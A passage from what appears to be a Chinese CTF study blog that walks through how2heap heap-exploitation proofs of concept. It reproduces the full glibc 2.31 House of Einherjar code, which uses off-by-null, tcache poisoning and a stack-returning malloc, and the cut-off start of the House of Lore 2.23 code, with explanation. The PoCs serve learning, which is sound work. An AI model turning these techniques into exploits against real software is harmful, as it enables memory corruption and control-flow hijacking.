d);<br>&#125;<br></code></pre></td></tr></table></figure><p>代码虽然比较长，但是比较容易理解。<br>首先堆块布局如图所示。这里的fake_size就是fake_chunk和b的距离，是为了在free(b)后与前面已经释放的堆块（prev_inuse为0）合并，从而下一次malloc的时候可以在fake_chunk处（栈上）申请堆块，就使得malloc可控（当然在fake_chunk在堆上也可以）。<br><img src="https://i.imgur.com/n8DaXjA.png"><br>这里解释一下fake_chunk数组每个元素的作用，我们可以先把他们注释掉，然后查看报错原因去malloc源码里查。<br>首先注释掉fake_chunk[2]和fake_chunk[3]，我们可以看到报错原因如下，我们在<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html">网站</a>查找报错原因，可以看到需要通过检查<code>(fd-&gt;bk != p || bk-&gt;fd != p</code>,所以设置fake_chunk的fd和bk都为自己本身来通过检查。<br><img src="https://i.imgur.com/N1JrF1K.png"><br><img src="https://i.imgur.com/RDUyhU6.png"></p><p>然后注释掉fake_chunk[4]和fake_chunk[5]，我们可以看到报错原因如下，是因为需要通过检查<code>p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p</code>，所以设置fake_chunk的fd_nextsize和bk_nextsize指向自身。为什么要走这条分支呢，是因为我们的fake_chunk的size设置的非常大，满足了<code>!in_smallbin_range (chunksize_nomask (p)</code>。<br><img src="https://i.imgur.com/VjxkxkZ.png"></p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>2.31最主要是因为加入了tcache导致了利用稍微复杂一点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.</span><br><span class="hljs-comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span><br><span class="hljs-comment">     * It has the additional requirement of a heap leak. </span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span><br><span class="hljs-comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span><br><span class="hljs-comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span><br><span class="hljs-comment">     * allocated from the system in this arena:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span><br><br>    <span class="hljs-built_in">setbuf</span>(stdin, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span><br>           <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);<br><br>    <span class="hljs-comment">// prepare the target</span><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="hljs-type">char</span> *) &amp;stack_var);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>    <span class="hljs-comment">// create a fake chunk</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);<br><br>    a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>    a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>    a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>    a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, a[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span><br>           <span class="hljs-string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span><br>           <span class="hljs-string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>    <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);<br><br>    <span class="hljs-comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span><br><span class="hljs-comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span><br><span class="hljs-comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);<br>    b[real_b_size] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span><br>           <span class="hljs-string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);<br><br>    <span class="hljs-comment">// Write a fake prev_size to the end of b</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span><br>           <span class="hljs-string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>, a, fake_size);<br>    *(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    <span class="hljs-comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);<br>    a[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nFill tcache.\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fill up tcache list.\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-built_in">sizeof</span>(x)/<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(c);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>    <span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);<br><br>    <span class="hljs-comment">// tcache poisoning</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span><br>           <span class="hljs-string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);<br>    <span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">free</span>(pad);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);<br>    d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>) stack_var;<br><br>    <span class="hljs-comment">// take target out</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we can cash out the target chunk.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);<br><br>    <span class="hljs-comment">// sanity check</span><br>    <span class="hljs-built_in">assert</span>(e == stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>2.23只需要用到两个堆块，a堆块用来伪造b堆块的prev_size以及将prev_inuse位清零，而2.31版需要用到三个堆块，假设b堆块有off-by-null溢出，a和c的作用是释放c的时候对a进行unlink从而将fake_chunk,b和c合并成一个大堆块，从而对b进行overlap，使得在b释放的时候也能修改b堆块内的值。在a处伪造fake_chunk是因为这样可以很容易填写自己想要的数据，a[2]和a[3]填入a是为了满足unlink的检查，b的作用是当b被释放进tcache中时，修改b的fd指向stack_var从而伪造tcache链，这样在下下次malloc的时候就能够在stack_var的位置处申请一个堆块。<br><img src="https://i.imgur.com/oY9wSlo.png"></p><p>我们可以看到，在free(b)后tcache的情况如图所示，因为pad是在b之前释放的，因此此时b的fd指向pad，因为我们对b进行了overlap，因此<code> d[0x30 / 8] = (long) stack_var</code>这条语句修改了b的fd的值。<br><img src="https://i.imgur.com/LeoR1SP.png"></p><p>修改之后的情况如图所示，此时b的fd指针指向stack_var，因为tcache是后进先出的，因此下一次malloc（0x28）的时候返回的地址是b，再一次malloc（0x28）的时候返回的地址就是stack_var<br><img src="https://i.imgur.com/WLM08Y1.png"></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of lore</title>
    <link href="/2022/07/06/house-of-lore/"/>
    <url>/2022/07/06/house-of-lore/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h1><p>本篇也是跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>来学习的，代码可以去上面下载编译。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>首先先看一下2.23版本的，house of lore其实就是伪造一个smallbins链，伪造的smallbins是在栈上的，因此malloc的时候会malloc栈上的空间，此时就可以覆盖返回地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      bck = victim-&gt;bk;</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">       bin-&gt;bk = bck;</span><br><span class="hljs-comment">       bck-&gt;fd = bin;</span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span></span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Lore\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br>         <span class="hljs-string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br>         <span class="hljs-string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span><br>         <span class="hljs-string">&quot;chunk on stack&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br>  <br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br>         <span class="hljs-string">&quot;the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span 